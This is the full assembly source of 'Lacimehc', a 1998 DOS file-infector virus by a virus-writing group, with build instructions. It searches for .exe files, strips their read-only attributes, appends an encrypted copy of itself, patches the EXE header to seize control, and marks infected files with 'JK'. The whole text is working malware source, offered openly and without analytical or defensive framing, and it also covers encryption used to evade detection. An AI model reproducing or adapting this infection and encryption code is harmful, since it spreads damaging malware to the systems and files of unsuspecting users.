; ------------------------------------------------------------------------- ;
;        Lacimehc v1.0 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 13/06/98 | Finished: 15/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - first attempt at .EXE infection, probably full of      | Size: 597 ;
;      - errors and unoptimized stuff, but I will fix all       `---------- ;
;      - that when I have a better understanding of what the                ;
;      - hell is actually going on, it's complicated! hehe                  ;
; v1.1 - added encryption to this exe appender! XOR,ROR,NEG                 ;
; ------------------------------------------------------------------------- ;
; ---------------> You Cannot Sedate All The Things You Hate <------------- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm lacimehc.asm                                          ;
; to link :::::] tlink /t lacimehc.obj                                      ;
; ------------------------------------------------------------------------- ;

code    segment                                 ; name our segment 'code'
        assume  cs:code,ds:code                 ; assign CS and DS to code
        org     100h                            ; original is a .com file

blank:  db      0e9h,0,0                        ; jump to beginning
start:  call    delta                           ; push IP on to the stack
delta:  pop     bp                              ; pop it into BP
        sub     bp,offset delta                 ; get the delta offset

        push    ds es                           ; save original DS and ES
        push    cs cs                           ; push CS twice
        pop     ds es                           ; CS = DS = ES now

decr:   jmp     once                            ; jump to once (overwritten)
        lea     si,[bp+encd]                    ; points to encrypted area
        mov     di,si                           ; move the value into DI
        call    encr                            ; call our decryption loop
        jmp     encd                            ; jump to main virus

encr:   lodsb                                   ; load a byte into al
        ror     al,4                            ; encryptin 1
        neg     al                              ; encryptin 2
        xor     al,byte ptr [bp+key]            ; encryptin 3 -final-
        neg     al                              ; unencrypt 2
        ror     al,4                            ; unencrypt 1
        stosb                                   ; return the byte
        loop    encr                            ; do this for all bytes
        ret                                     ; return from call
        key db 0                                ; our key value
        
encd:   mov     ax,word ptr [bp+exe_cs]         ; exe_cs and _cs 
        mov     word ptr [bp+_cs],ax            ; are now equal

        push    [bp+exe_cs]                     ; save CS
        push    [bp+exe_ip]                     ; save IP
        push    [bp+exe_ss]                     ; save SS
        push    [bp+exe_sp]                     ; save SP

        mov     ah,1ah                          ; set new DTA location
        lea     dx,[bp+offset dta]              ; new DTA goes here
        int     21h                             ; DTA is now moved

        mov     ah,4eh                          ; find first file
        lea     dx,[bp+exefile]                 ; with extension .exe
        mov     cx,7                            ; possible attributes

findit: int     21h                             ; find a .exe
        jnc     cont                            ; found one? continue on
        jmp     exit                            ; return control to host

cont:   lea     dx,[bp+dta+1eh]                 ; get file name info
        mov     ax,4300h                        ; get file attributes
        int     21h                             ; get them now
        push    cx                              ; save the attributes
        push    dx                              ; and the file name info

        mov     ax,4301h                        ; set file attributes
        xor     cx,cx                           ; to none at all
        int     21h                             ; infect even read only now

        mov     ax,3d02h                        ; open the file
        int     21h                             ; file is opened
        xchg    bx,ax                           ; move file handle in BX
        jnc     cont2                           ; no problems? continue on
        jmp     abort                           ; whoops, find another one

cont2:  mov     ax,5700h                        ; get the time / date stamps
        int     21h                             ; we have the stamps
        push    cx                              ; save the time
        push    dx                              ; save the date

        mov     ah,3fh                          ; read from file
        mov     cx,1ch                          ; read the EXE header
        lea     dx,[bp+offset header]           ; store it into 'header'
        int     21h                             ; do the int 21 this time

        cmp     word ptr [bp+header],'ZM'       ; check for the initials
        je      cont3                           ; its good, infect it
        cmp     word ptr [bp+header],'MZ'       ; check for the initials
        je      cont3                           ; its good, infect it
        jmp     next                            ; find next file

cont3:  cmp     word ptr [bp+header+10h],'JK'   ; check for our ID bytes
        jne     cont4                           ; not done before, infect it
        jmp     next                            ; infected, get another one

cont4:  mov     ax,word ptr [bp+header+18h]     ; load AX with offset 40h
	cmp	ax,40h				; is this a WinEXE file?
        jnae    cont5                           ; nope, continue on 
        jmp     next                            ; yup it is, get another one

cont5:  cmp     word ptr [bp+header+1ah],0      ; check for internal overlays
        je      infect                          ; nope, infect this file now
        jmp     next                            ; there are, get another one

infect: push    bx                              ; save file handle
        mov     ax,word ptr [bp+header+0eh]     ; get original SS into AX
        mov     word ptr [bp+exe_ss],ax         ; save it into exe_ss
        mov     ax,word ptr [bp+header+10h]     ; get original SP into AX
        mov     word ptr [bp+exe_sp],ax         ; save it into exe_sp
        mov     ax,word ptr [bp+header+14h]     ; get original IP into AX
        mov     word ptr [bp+exe_ip],ax         ; save it into exe_ip
        mov     ax,word ptr [bp+header+16h]     ; get original CS into ax
        mov     word ptr [bp+exe_cs],ax         ; save it into exe_cs

        mov     ax,4202h                        ; scan to end of file
        xor     cx,cx                           ; xor cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; DX:AX holds file size now
        push    ax dx                           ; save file size for awhile

        mov     bx,word ptr [bp+header+8h]      ; header size in paragraphs
        mov     cl,4                            ; load CL with 4
        shl     bx,cl                           ; multiply bx by 16 (4x4=16)
        sub     ax,bx                           ; subtract file size
        sbb     dx,0                            ; if CF is set subtract 1
        mov     cx,10h                          ; cx = 10h = 16
        div     cx                              ; undue our mutiplying x16

        mov     word ptr [bp+header+14h],dx     ; put the offset in
        mov     word ptr [bp+header+16h],ax     ; segment offset of code
        mov     word ptr [bp+header+0eh],ax     ; segment offset of stack
        mov     word ptr [bp+header+10h],'JK'   ; put our ID in

        pop     dx ax bx                        ; restore file size / handle

        add     ax,finished-start               ; add our virus size
        adc     dx,0                            ; if CF add 1, if not, 0
        mov     cx,512                          ; convert to pages
        div     cx                              ; by dividing by 512
        inc     ax                              ; round up
        mov     word ptr [bp+header+4],ax       ; put the new PageCnt up
        mov     word ptr [bp+header+2],dx       ; put the new PartPag up

        mov     ax,4202h                        ; scan to end of file
        xor     cx,cx                           ; xor cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; DX:AX holds file size now

        in      al,40h                          ; get a random value
        mov     byte ptr [bp+key],al            ; save as our key

        mov     ah,40h                          ; write to file
        lea     dx,[bp+start]                   ; starting here
        mov     cx,encd-start                   ; # of bytes to write
        int     21h                             ; write them now

        lea     di,[bp+finished]                ; where to put bytes
        push    di                              ; save value 
        lea     si,[bp+encd]                    ; where to get bytes
        mov     cx,finished-encd                ; # of bytes to do
        push    cx                              ; save value
        call    encr                            ; encrypt the bytes

        mov     ah,40h                          ; write to file
        pop     cx                              ; restore first value
        pop     dx                              ; restore second value
        int     21h                             ; write them to file

        mov     ax,4200h                        ; seek to start of file
        xor     cx,cx                           ; cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; at start of file now

        mov     ah,40h                          ; write to file
        lea     dx,[bp+header]                  ; write the new header
        mov     cx,1ch                          ; # of bytes to write
        int     21h                             ; write it now

next:   mov     ax,5701h                        ; set time / date stamps
        pop     dx                              ; restore the date
        pop     cx                              ; restore the time
        int     21h                             ; time / date are restored

        mov     ah,3eh                          ; close the file
        int     21h                             ; close it up now

abort:  mov     ax,4301h                        ; set file attributes
        pop     dx                              ; for this file name
        pop     cx                              ; with these attributes
        int     21h                             ; attributes are restored

        mov     ah,4fh                          ; find next file
        jmp     findit                          ; start all over again

exit:   pop     [bp+exe_sp]                     ; restore SP
        pop     [bp+exe_ss]                     ; restore SS
        pop     [bp+exe_ip]                     ; restore IP
        pop     [bp+exe_cs]                     ; restore CS

        mov     ah,1ah                          ; restore the DTA
        mov     dx,80h                          ; new address for DTA
        int     21h                             ; back to original location

        pop     es ds                           ; pop ES and DS from stack
        mov     ax,es                           ; ax points to PSP
        add     ax,10h                          ; skip over the PSP
        add     word ptr cs:[bp+_cs],ax         ; restoring CS
        mov     bx,word ptr cs:[bp+exe_ip]      ; move the IP into bx
        mov     word ptr cs:[bp+_ip],bx         ; save the IP into _ip

        cli                                     ; clear interrupt flag
        mov     sp,word ptr cs:[bp+exe_sp]      ; adjust ExeSP
        add     ax,word ptr cs:[bp+exe_ss]      ; restore the stack
        mov     ss,ax                           ; adjust ReloSS
        sti                                     ; set interrupt flag

        db      0eah                            ; jmp far ptr cs:ip

; ---------------------------( The Data Area )----------------------------- ;
; ------------------------------------------------------------------------- ;

        _ip     dw 0                    ; used as offset for db 0eah
        _cs     dw 0                    ; used as offset for db 0eah
        exe_cs  dw 0fff0h               ; original CS
        exe_ip  dw 0                    ; original IP
        exe_sp  dw 0                    ; original SP
        exe_ss  dw 0                    ; original SS
        exefile db "*.exe",0            ; infecting .exe files
        header  db 1ch dup (?)          ; space for the header
        dta     db 43 dup (?)           ; space for the new dta
        finished:                       ; end of the virus

; ---------------------( Not Saved / Not Encrypted )----------------------- ;
; ------------------------------------------------------------------------- ;

once:   lea     si,[bp+new]             ; bytes to move
        lea     di,[bp+decr]            ; to be moved here
        movsw                           ; move two bytes
        movsb                           ; move one byte
        jmp     encd                    ; jump to main body
new:    mov     cx,finished-encd        ; this replaces the jump

; -----------------------------( The End )--------------------------------- ;
; ------------------------------------------------------------------------- ;

        code    ends                    ; end code segment
        end     blank                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;

